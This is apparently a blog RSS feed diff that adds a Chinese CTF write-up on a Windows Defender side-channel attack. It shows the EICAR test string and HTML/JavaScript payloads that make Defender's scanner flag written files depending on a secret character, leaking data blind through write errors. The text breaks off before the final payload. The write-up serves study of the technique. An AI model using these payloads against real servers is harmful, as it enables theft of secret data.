@@ -1,1 +1,1411 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>侧信道 on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/</link><description>Recent content in 侧信道 on Zeddy's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 17 Sep 2019 22:22:10 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/atom.xml" rel="self" type="application/rss+xml"/><item><title>Windows Defender 侧信道攻击</title><link>https://zeddyu.github.io/2019/09/17/windows-defender/</link><pubDate>Tue, 17 Sep 2019 22:22:10 +0000</pubDate><guid>https://zeddyu.github.io/2019/09/17/windows-defender/</guid><description>&lt;p>在今年的 WCTF 2019 上，Tokyo Westerns 出了一道与 Windows Defender 侧信道攻击相关的题目，在 Tokyo Westerns CTF 2019 上也有一道与之有关的题目 PHP Note，看了感觉比较有趣，但是我看的网络文章写的都比较粗略，这里我就记录一下自己的分析。&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>侧信道 on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/</link><description>Recent content in 侧信道 on Zeddy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 17 Sep 2019 22:22:10 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/atom.xml" rel="self" type="application/rss+xml"/><item><title>Windows Defender 侧信道攻击</title><link>https://zeddyu.github.io/p/windows-defender-%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</link><pubDate>Tue, 17 Sep 2019 22:22:10 +0000</pubDate><guid>https://zeddyu.github.io/p/windows-defender-%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</guid><description>&lt;p>在今年的 WCTF 2019 上，Tokyo Westerns 出了一道与 Windows Defender 侧信道攻击相关的题目，在 Tokyo Westerns CTF 2019 上也有一道与之有关的题目 PHP Note，看了感觉比较有趣，但是我看的网络文章写的都比较粗略，这里我就记录一下自己的分析。&lt;/p>
+&lt;h2 id="windows-defender">Windows Defender
+&lt;/h2>&lt;p>众所周知，Windows Defender 是 Windows 10 平台上一款自带的安全防护软件，&lt;del>游戏弹窗杀手&lt;/del>&lt;/p>
+&lt;p>{% colorquote info %}&lt;/p>
+&lt;p>Windows Defender（Windows 10 创意者更新后名为Windows Defender Antivirus），曾用名Microsoft AntiSpyware，最初是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。Windows Defender的定义库更新很频繁。在Windows 8及之后的系统中取代Microsoft Security Essentials，成为一款全面反病毒软件。&lt;/p>
+&lt;p>Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。&lt;/p>
+&lt;p>{% endcolorquote %}&lt;/p>
+&lt;h2 id="what-windows-defender-will-do">What Windows Defender will do
+&lt;/h2>&lt;p>根据 TW 的分析，Windows Defender 会有以下行为：&lt;/p>
+&lt;ol>
+&lt;li>检查文件内容是否有恶意内容&lt;/li>
+&lt;li>改变恶意文件的权限以避免用户去加载&lt;/li>
+&lt;li>替换恶意内容为空&lt;/li>
+&lt;li>删除整个文件&lt;/li>
+&lt;/ol>
+&lt;p>在第二步中，如果文件被 Windows Defender 检测出是恶意文件的话，用户就不可以访问了。&lt;/p>
+&lt;h2 id="make-windows-defender-angry">Make Windows Defender Angry
+&lt;/h2>&lt;h3 id="eicar">EICAR
+&lt;/h3>&lt;p>{% colorquote info %}&lt;/p>
+&lt;p>EICAR标准反病毒测试文件，又称EICAR测试文件, 是由欧洲反计算机病毒协会（EICAR）与计算机病毒研究组织（CARO）研制的文件, 用以测试杀毒软件的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。&lt;/p>
+&lt;p>{% endcolorquote %}&lt;/p>
+&lt;p>我们可以使用以下字符串测试 Windows Defender&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>只需要将这个字符串复制，然后保存在一个空白的 txt 文件当中即可触发 Windwos Defender，所以我们先通过这个样例来检查一下自己的 Windows Defender 是否开启。&lt;/p>
+&lt;h3 id="mpenginedll">Mpengine.dll
+&lt;/h3>&lt;p>根据 Tokyo Westerns 的分析，Windows Defender 有一个核心 dll 文件 Mpengine.dll ，他可以对不同的内容进行分析，包括一些 base64 encode/RAR archived/etc. ，其中比较有意思的是它还有一个 Javascript Engine。&lt;/p>
+&lt;p>这个引擎可以分析 HTML 文档，并且可以分析其中的 Javascript 代码，包括对文档中的 DOM 元素的访问。&lt;/p>
+&lt;p>我们可以做个简单的验证，我们先只使用以下代码测试：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181803.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>可以发现我们并没有触发 Windows Defender，即使字符串是 EICAR 测试样本，说明了字符串不受 EICAR 特征影响。&lt;/p>
+&lt;p>接着我们尝试添加一下&lt;code>eval&lt;/code>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181841.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>没错，在保存的时候就立马触发了 Windows Defender ，足以验证当中有一个 Javascript Engine 进行了内容检测，而且即使没有完整的 Javascript 标签，也可以触发 Windows defender。&lt;/p>
+&lt;h3 id="interesting-check">Interesting Check
+&lt;/h3>&lt;p>接下来我们再看几个测试例子：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100623.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>非常棒，并没有被检测出恶意内容。&lt;/p>
+&lt;p>接着我们再试着加一个&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100640.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>也很棒，也没有检测出恶意内容。&lt;/p>
+&lt;p>让我们再操作一下 DOM 元素：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100648.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>Done! 触发了恶意内容检测。&lt;/p>
+&lt;p>那如果我们把 EICAR 内容进行一下拆分呢？&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">body&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>a&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103004.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>这里我们获取的是&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的第一个字符，也就是&lt;code>a&lt;/code>，不构成 EICAR 测试样本，所以触发不了 Windows Defender 也很正常。&lt;/p>
+&lt;p>那我们改一下&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签当中的内容呢？使用&lt;code>*&lt;/code>试试看&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">body&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>*&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103146.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>很棒，意料之中地触发了 Windows Defender。&lt;/p>
+&lt;h3 id="go-hacking">Go Hacking
+&lt;/h3>&lt;p>那触发 Windows Defender 会有什么问题吗？虽然这里看似没什么毛病，但是放到业务代码里面就不一样了。&lt;/p>
+&lt;p>仔细想想一般程序猿会这么写文件呢？细心的程序猿在进行写文件之后要 check 一遍是否写入成功，类似:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$err&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">file_put_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/tmp/file_name&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;something need to be saved&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nv">$err&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">Exception&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>file_put_contents&lt;/code>在写入成功后返回写入多少个字节，失败的时候返回&lt;code>False&lt;/code>，然后我们就可以利用这个特性，当我们写入恶意数据的时候，因为 Windows Defender 检查出恶意内容，禁止了用户读取权限或者删除了文件，导致服务因为检查写入不成功抛出异常，而对于我们来说可能直接返回错误的状态码类似 500 。&lt;/p>
+&lt;p>所以我们可以总结一下，大致我们可以有这么一套侧信道攻击的攻击链：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">eval(&amp;#34;EICA&amp;#34;+input) -&amp;gt; ?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> detected -&amp;gt; input is &amp;#39;R&amp;#39;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> not detected -&amp;gt; input is not &amp;#39;R&amp;#39;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果内容中有&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签，并且如果有无法通过正常手段读到的数据，我们可以尝试用这种类似“盲注”的方式去获取秘密数据&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">JavaScript can access the elements :)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">○ if they have &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> tag
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">○ &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>[secret]&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里需要注意的是，Tokyo Westerns 指出使用&lt;code>if&lt;/code>语句构造的 EICAR 样本，Windows Defender 是不会检测出来的，例如以下 payload ，&lt;code>mal&lt;/code>已经可以构造出 EICAR 样本，但是不会触发 Windows Denfender 的，但是大致思路我们可以通过这段代码来理解&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">n&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>flag{aaa}&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然后我们大致修改一下，不使用&lt;code>if&lt;/code>作为判断选择条件，使用&lt;code>Math.min()&lt;/code>作为判断选择，所以大致我们可以得到这么个 payload :&lt;/p>
